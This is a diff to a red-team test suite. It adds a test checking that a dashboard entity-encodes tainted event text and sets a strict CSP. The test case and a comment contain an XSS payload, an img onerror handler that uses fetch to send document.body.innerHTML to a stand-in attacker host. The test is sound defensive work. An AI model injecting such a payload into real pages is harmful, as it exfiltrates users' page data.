@@ -709,6 +709,22 @@ def redteam_attacks() -> tuple[RedTeamAttack, ...]:
             intent="wire a fluid value toward a static-only sink target and run it",
             control="cra272-run-path-assembly-gate (ALG-3, fails closed before any run)",
         ),
+        # -- craw code: dashboard renders tainted ledger text (UNFILED-XSS) -------
+        # The dashboard is a NEW fluid surface: it renders ObserverEvent.detail (a
+        # model-derived/fluid field) into HTML on a loopback page. Scrubbing removes
+        # secrets, NOT markup — a poisoned ticket body surfaces as a `detail` carrying an
+        # `<img ... onerror=fetch('http://attacker/'+document.body.innerHTML)>` SSRF beacon.
+        # The render layer's `encode_field` chokepoint entity-encodes it inert; the strict CSP
+        # (`default-src 'none'`, `img-src 'self'`, `connect-src 'self'`) blocks the beacon even
+        # if encoding were bypassed. Loopback (rule 3) limits WHO reaches the page, not what
+        # injected script does once loaded — so encoding + CSP are mandatory, not optional.
+        RedTeamAttack(
+            name="dashboard_tainted_detail_xss_ssrf_beacon",
+            surface="dashboard_xss",
+            payload=("<img src=x onerror=fetch('http://attacker.test/'+document.body.innerHTML)>"),
+            intent="execute injected script / beacon other-org data off-host from the dashboard",
+            control="unfiled-xss-output-encoding + strict-csp (default-src 'none')",
+        ),
     )
 
 
@@ -952,6 +968,30 @@ def _build_blocked(attack: RedTeamAttack) -> RedTeamResult:
             attack,
             blocked=False,
             how="the run-path assembly gate did NOT reject a fluid→sink wiring",
+        )
+
+    if surface == "dashboard_xss":
+        # A tainted ObserverEvent.detail rendered into the dashboard HTML: the encode_field
+        # chokepoint must render the `<img onerror=…>` SSRF beacon inert (entity-encoded, no
+        # live tag), and the strict CSP must deny off-host img/connect. We assert BOTH legs.
+        from crawfish.code.dashboard.encoding import CSP, Encoding, encode_field
+
+        encoded = encode_field(attack.payload, Encoding.HTML_BODY)
+        inert = (
+            "<img" not in encoded  # no live tag survives (the browser sees inert text)
+            and "&lt;img" in encoded  # the angle bracket was entity-encoded
+        )
+        csp_blocks_beacon = (
+            "default-src 'none'" in CSP and "img-src 'self'" in CSP and "connect-src 'self'" in CSP
+        )
+        if inert and csp_blocks_beacon:
+            return RedTeamResult(
+                attack,
+                blocked=True,
+                how="UNFILED-XSS encoded the payload inert + strict CSP blocks the off-host beacon",
+            )
+        return RedTeamResult(
+            attack, blocked=False, how="the dashboard rendered tainted markup live or lacked CSP"
         )
 
     raise AssertionError(f"unknown red-team surface {surface!r}")
